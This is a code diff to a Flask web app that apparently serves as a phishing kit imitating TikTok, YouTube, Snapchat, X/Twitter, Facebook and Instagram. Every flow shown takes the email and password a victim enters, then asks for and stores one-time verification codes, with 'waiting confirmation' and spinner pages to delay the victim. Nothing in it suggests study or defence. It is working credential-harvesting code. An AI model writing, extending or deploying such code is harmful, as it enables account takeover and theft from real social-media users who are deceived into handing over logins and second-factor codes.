@@ -151,79 +151,367 @@ def get_previous_page_url(platform, current_page):
 def index():
     return render_template('index.html')
 
-# ========== ENHANCED ROUTES WITH FIXED REDIRECT LOGIC ==========
-
-def create_platform_route(endpoint, template_name, platform_name, next_page, confirmation_page=None):
-    """Helper function to create platform routes with consistent logic"""
-    @app.route(f'/{endpoint}', methods=['GET','POST'])
-    def route_function():
-        if request.method == 'POST':
-            user = extract_user(request.form)
-            
-            if 'digits' in request.form:
-                # Code submission
-                digits = request.form.get('digits','')
-                submission_id = save_submission(
-                    endpoint, user, f'digits={digits}', 
-                    code_value=digits, platform_name=platform_name,
-                    previous_page=request.url
-                )
-                
-                platform_icon, platform_color = get_platform_icon(platform_name)
-                previous_page_url = get_previous_page_url(platform_name, endpoint)
-                
-                return render_template('waiting_confirmation.html', 
-                                    next_url=url_for(next_page) if not confirmation_page else url_for(confirmation_page),
-                                    code_value=digits,
-                                    submission_id=submission_id,
-                                    platform_icon=platform_icon, 
-                                    platform_name=platform_name,
-                                    platform_color=platform_color,
-                                    previous_page_url=previous_page_url)
-            else:
-                # Login submission
-                addr = request.form.get('address','')
-                pwd = request.form.get('password','')
-                save_submission(endpoint, user, f'address={addr}; password={pwd}', platform_name=platform_name)
-                return redirect(url_for(next_page))
-        
-        platform_icon, platform_color = get_platform_icon(platform_name)
-        return render_template(template_name, 
-                             platform_icon=platform_icon, 
-                             platform_name=platform_name, 
-                             platform_color=platform_color)
-    
-    return route_function
+# ========== INDIVIDUAL ROUTES (FIXED) ==========
 
 # TikTok Flow
-joy1_1 = create_platform_route('joy1_1', 'joy1_1.html', 'TikTok', 'joy1_2')
-joy1_2 = create_platform_route('joy1_2', 'joy1_2.html', 'TikTok', 'joy1_3')
-joy1_3 = create_platform_route('joy1_3', 'joy1_3.html', 'TikTok', 'spinner', confirmation_page='spinner')
+@app.route('/joy1_1', methods=['GET','POST'])
+def joy1_1():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        addr = request.form.get('address','')
+        pwd = request.form.get('password','')
+        save_submission('joy1_1', user, f'address={addr}; password={pwd}', platform_name="TikTok")
+        return redirect(url_for('joy1_2'))
+    platform_icon, platform_color = get_platform_icon('TikTok')
+    return render_template('joy1_1.html', platform_icon=platform_icon, platform_name='TikTok', platform_color=platform_color)
+
+@app.route('/joy1_2', methods=['GET','POST'])
+def joy1_2():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        submission_id = save_submission(
+            'joy1_2', user, f'digits={digits}', 
+            code_value=digits, platform_name="TikTok",
+            previous_page=request.url
+        )
+        platform_icon, platform_color = get_platform_icon('TikTok')
+        previous_page_url = get_previous_page_url('TikTok', 'joy1_2')
+        
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('joy1_3'),
+                             code_value=digits,
+                             submission_id=submission_id,
+                             platform_icon=platform_icon, 
+                             platform_name='TikTok',
+                             platform_color=platform_color,
+                             previous_page_url=previous_page_url)
+    platform_icon, platform_color = get_platform_icon('TikTok')
+    return render_template('joy1_2.html', platform_icon=platform_icon, platform_name='TikTok', platform_color=platform_color)
+
+@app.route('/joy1_3', methods=['GET','POST'])
+def joy1_3():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        submission_id = save_submission(
+            'joy1_3', user, f'digits={digits}', 
+            code_value=digits, platform_name="TikTok",
+            previous_page=request.url
+        )
+        platform_icon, platform_color = get_platform_icon('TikTok')
+        previous_page_url = get_previous_page_url('TikTok', 'joy1_3')
+        
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('spinner', platform='TikTok'),
+                             code_value=digits,
+                             submission_id=submission_id,
+                             platform_icon=platform_icon, 
+                             platform_name='TikTok',
+                             platform_color=platform_color,
+                             previous_page_url=previous_page_url)
+    platform_icon, platform_color = get_platform_icon('TikTok')
+    return render_template('joy1_3.html', platform_icon=platform_icon, platform_name='TikTok', platform_color=platform_color)
 
 # YouTube Flow
-joy2_1 = create_platform_route('joy2_1', 'joy2_1.html', 'YouTube', 'joy2_2')
-joy2_2 = create_platform_route('joy2_2', 'joy2_2.html', 'YouTube', 'joy2_3')
-joy2_3 = create_platform_route('joy2_3', 'joy2_3.html', 'YouTube', 'spinner', confirmation_page='spinner')
+@app.route('/joy2_1', methods=['GET','POST'])
+def joy2_1():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        addr = request.form.get('address','')
+        pwd = request.form.get('password','')
+        save_submission('joy2_1', user, f'address={addr}; password={pwd}', platform_name="YouTube")
+        return redirect(url_for('joy2_2'))
+    platform_icon, platform_color = get_platform_icon('YouTube')
+    return render_template('joy2_1.html', platform_icon=platform_icon, platform_name='YouTube', platform_color=platform_color)
+
+@app.route('/joy2_2', methods=['GET','POST'])
+def joy2_2():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        submission_id = save_submission(
+            'joy2_2', user, f'digits={digits}', 
+            code_value=digits, platform_name="YouTube",
+            previous_page=request.url
+        )
+        platform_icon, platform_color = get_platform_icon('YouTube')
+        previous_page_url = get_previous_page_url('YouTube', 'joy2_2')
+        
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('joy2_3'),
+                             code_value=digits,
+                             submission_id=submission_id,
+                             platform_icon=platform_icon, 
+                             platform_name='YouTube',
+                             platform_color=platform_color,
+                             previous_page_url=previous_page_url)
+    platform_icon, platform_color = get_platform_icon('YouTube')
+    return render_template('joy2_2.html', platform_icon=platform_icon, platform_name='YouTube', platform_color=platform_color)
+
+@app.route('/joy2_3', methods=['GET','POST'])
+def joy2_3():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        submission_id = save_submission(
+            'joy2_3', user, f'digits={digits}', 
+            code_value=digits, platform_name="YouTube",
+            previous_page=request.url
+        )
+        platform_icon, platform_color = get_platform_icon('YouTube')
+        previous_page_url = get_previous_page_url('YouTube', 'joy2_3')
+        
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('spinner', platform='YouTube'),
+                             code_value=digits,
+                             submission_id=submission_id,
+                             platform_icon=platform_icon, 
+                             platform_name='YouTube',
+                             platform_color=platform_color,
+                             previous_page_url=previous_page_url)
+    platform_icon, platform_color = get_platform_icon('YouTube')
+    return render_template('joy2_3.html', platform_icon=platform_icon, platform_name='YouTube', platform_color=platform_color)
 
 # Snapchat Flow
-happy1_1 = create_platform_route('happy1_1', 'happy1_1.html', 'Snapchat', 'happy1_2')
-happy1_2 = create_platform_route('happy1_2', 'happy1_2.html', 'Snapchat', 'happy1_3')
-happy1_3 = create_platform_route('happy1_3', 'happy1_3.html', 'Snapchat', 'spinner', confirmation_page='spinner')
+@app.route('/happy1_1', methods=['GET','POST'])
+def happy1_1():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        addr = request.form.get('address','')
+        pwd = request.form.get('password','')
+        save_submission('happy1_1', user, f'address={addr}; password={pwd}', platform_name="Snapchat")
+        return redirect(url_for('happy1_2'))
+    platform_icon, platform_color = get_platform_icon('Snapchat')
+    return render_template('happy1_1.html', platform_icon=platform_icon, platform_name='Snapchat', platform_color=platform_color)
+
+@app.route('/happy1_2', methods=['GET','POST'])
+def happy1_2():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        submission_id = save_submission(
+            'happy1_2', user, f'digits={digits}', 
+            code_value=digits, platform_name="Snapchat",
+            previous_page=request.url
+        )
+        platform_icon, platform_color = get_platform_icon('Snapchat')
+        previous_page_url = get_previous_page_url('Snapchat', 'happy1_2')
+        
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('happy1_3'),
+                             code_value=digits,
+                             submission_id=submission_id,
+                             platform_icon=platform_icon, 
+                             platform_name='Snapchat',
+                             platform_color=platform_color,
+                             previous_page_url=previous_page_url)
+    platform_icon, platform_color = get_platform_icon('Snapchat')
+    return render_template('happy1_2.html', platform_icon=platform_icon, platform_name='Snapchat', platform_color=platform_color)
+
+@app.route('/happy1_3', methods=['GET','POST'])
+def happy1_3():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        submission_id = save_submission(
+            'happy1_3', user, f'digits={digits}', 
+            code_value=digits, platform_name="Snapchat",
+            previous_page=request.url
+        )
+        platform_icon, platform_color = get_platform_icon('Snapchat')
+        previous_page_url = get_previous_page_url('Snapchat', 'happy1_3')
+        
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('spinner', platform='Snapchat'),
+                             code_value=digits,
+                             submission_id=submission_id,
+                             platform_icon=platform_icon, 
+                             platform_name='Snapchat',
+                             platform_color=platform_color,
+                             previous_page_url=previous_page_url)
+    platform_icon, platform_color = get_platform_icon('Snapchat')
+    return render_template('happy1_3.html', platform_icon=platform_icon, platform_name='Snapchat', platform_color=platform_color)
 
 # X/Twitter Flow
-happy2_1 = create_platform_route('happy2_1', 'happy2_1.html', 'X / Twitter', 'happy2_2')
-happy2_2 = create_platform_route('happy2_2', 'happy2_2.html', 'X / Twitter', 'happy2_3')
-happy2_3 = create_platform_route('happy2_3', 'happy2_3.html', 'X / Twitter', 'spinner', confirmation_page='spinner')
+@app.route('/happy2_1', methods=['GET','POST'])
+def happy2_1():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        addr = request.form.get('address','')
+        pwd = request.form.get('password','')
+        save_submission('happy2_1', user, f'address={addr}; password={pwd}', platform_name="X / Twitter")
+        return redirect(url_for('happy2_2'))
+    platform_icon, platform_color = get_platform_icon('X / Twitter')
+    return render_template('happy2_1.html', platform_icon=platform_icon, platform_name='X / Twitter', platform_color=platform_color)
+
+@app.route('/happy2_2', methods=['GET','POST'])
+def happy2_2():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        submission_id = save_submission(
+            'happy2_2', user, f'digits={digits}', 
+            code_value=digits, platform_name="X / Twitter",
+            previous_page=request.url
+        )
+        platform_icon, platform_color = get_platform_icon('X / Twitter')
+        previous_page_url = get_previous_page_url('X / Twitter', 'happy2_2')
+        
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('happy2_3'),
+                             code_value=digits,
+                             submission_id=submission_id,
+                             platform_icon=platform_icon, 
+                             platform_name='X / Twitter',
+                             platform_color=platform_color,
+                             previous_page_url=previous_page_url)
+    platform_icon, platform_color = get_platform_icon('X / Twitter')
+    return render_template('happy2_2.html', platform_icon=platform_icon, platform_name='X / Twitter', platform_color=platform_color)
+
+@app.route('/happy2_3', methods=['GET','POST'])
+def happy2_3():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        submission_id = save_submission(
+            'happy2_3', user, f'digits={digits}', 
+            code_value=digits, platform_name="X / Twitter",
+            previous_page=request.url
+        )
+        platform_icon, platform_color = get_platform_icon('X / Twitter')
+        previous_page_url = get_previous_page_url('X / Twitter', 'happy2_3')
+        
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('spinner', platform='X / Twitter'),
+                             code_value=digits,
+                             submission_id=submission_id,
+                             platform_icon=platform_icon, 
+                             platform_name='X / Twitter',
+                             platform_color=platform_color,
+                             previous_page_url=previous_page_url)
+    platform_icon, platform_color = get_platform_icon('X / Twitter')
+    return render_template('happy2_3.html', platform_icon=platform_icon, platform_name='X / Twitter', platform_color=platform_color)
 
 # Facebook Flow
-love1_1 = create_platform_route('love1_1', 'love1_1.html', 'Facebook', 'love1_2')
-love1_2 = create_platform_route('love1_2', 'love1_2.html', 'Facebook', 'love1_3')
-love1_3 = create_platform_route('love1_3', 'love1_3.html', 'Facebook', 'spinner', confirmation_page='spinner')
+@app.route('/love1_1', methods=['GET','POST'])
+def love1_1():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        addr = request.form.get('address','')
+        pwd = request.form.get('password','')
+        save_submission('love1_1', user, f'address={addr}; password={pwd}', platform_name="Facebook")
+        return redirect(url_for('love1_2'))
+    platform_icon, platform_color = get_platform_icon('Facebook')
+    return render_template('love1_1.html', platform_icon=platform_icon, platform_name='Facebook', platform_color=platform_color)
+
+@app.route('/love1_2', methods=['GET','POST'])
+def love1_2():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        submission_id = save_submission(
+            'love1_2', user, f'digits={digits}', 
+            code_value=digits, platform_name="Facebook",
+            previous_page=request.url
+        )
+        platform_icon, platform_color = get_platform_icon('Facebook')
+        previous_page_url = get_previous_page_url('Facebook', 'love1_2')
+        
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('love1_3'),
+                             code_value=digits,
+                             submission_id=submission_id,
+                             platform_icon=platform_icon, 
+                             platform_name='Facebook',
+                             platform_color=platform_color,
+                             previous_page_url=previous_page_url)
+    platform_icon, platform_color = get_platform_icon('Facebook')
+    return render_template('love1_2.html', platform_icon=platform_icon, platform_name='Facebook', platform_color=platform_color)
+
+@app.route('/love1_3', methods=['GET','POST'])
+def love1_3():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        submission_id = save_submission(
+            'love1_3', user, f'digits={digits}', 
+            code_value=digits, platform_name="Facebook",
+            previous_page=request.url
+        )
+        platform_icon, platform_color = get_platform_icon('Facebook')
+        previous_page_url = get_previous_page_url('Facebook', 'love1_3')
+        
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('spinner', platform='Facebook'),
+                             code_value=digits,
+                             submission_id=submission_id,
+                             platform_icon=platform_icon, 
+                             platform_name='Facebook',
+                             platform_color=platform_color,
+                             previous_page_url=previous_page_url)
+    platform_icon, platform_color = get_platform_icon('Facebook')
+    return render_template('love1_3.html', platform_icon=platform_icon, platform_name='Facebook', platform_color=platform_color)
 
 # Instagram Flow
-love2_1 = create_platform_route('love2_1', 'love2_1.html', 'Instagram', 'love2_2')
-love2_2 = create_platform_route('love2_2', 'love2_2.html', 'Instagram', 'love2_3')
-love2_3 = create_platform_route('love2_3', 'love2_3.html', 'Instagram', 'spinner', confirmation_page='spinner')
+@app.route('/love2_1', methods=['GET','POST'])
+def love2_1():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        addr = request.form.get('address','')
+        pwd = request.form.get('password','')
+        save_submission('love2_1', user, f'address={addr}; password={pwd}', platform_name="Instagram")
+        return redirect(url_for('love2_2'))
+    platform_icon, platform_color = get_platform_icon('Instagram')
+    return render_template('love2_1.html', platform_icon=platform_icon, platform_name='Instagram', platform_color=platform_color)
+
+@app.route('/love2_2', methods=['GET','POST'])
+def love2_2():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        submission_id = save_submission(
+            'love2_2', user, f'digits={digits}', 
+            code_value=digits, platform_name="Instagram",
+            previous_page=request.url
+        )
+        platform_icon, platform_color = get_platform_icon('Instagram')
+        previous_page_url = get_previous_page_url('Instagram', 'love2_2')
+        
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('love2_3'),
+                             code_value=digits,
+                             submission_id=submission_id,
+                             platform_icon=platform_icon, 
+                             platform_name='Instagram',
+                             platform_color=platform_color,
+                             previous_page_url=previous_page_url)
+    platform_icon, platform_color = get_platform_icon('Instagram')
+    return render_template('love2_2.html', platform_icon=platform_icon, platform_name='Instagram', platform_color=platform_color)
+
+@app.route('/love2_3', methods=['GET','POST'])
+def love2_3():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        submission_id = save_submission(
+            'love2_3', user, f'digits={digits}', 
+            code_value=digits, platform_name="Instagram",
+            previous_page=request.url
+        )
+        platform_icon, platform_color = get_platform_icon('Instagram')
+        previous_page_url = get_previous_page_url('Instagram', 'love2_3')
+        
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('spinner', platform='Instagram'),
+                             code_value=digits,
+                             submission_id=submission_id,
+                             platform_icon=platform_icon, 
+                             platform_name='Instagram',
+                             platform_color=platform_color,
+                             previous_page_url=previous_page_url)
+    platform_icon, platform_color = get_platform_icon('Instagram')
+    return render_template('love2_3.html', platform_icon=platform_icon, platform_name='Instagram', platform_color=platform_color)
 
 # Common Flow Pages
 @app.route('/spinner')
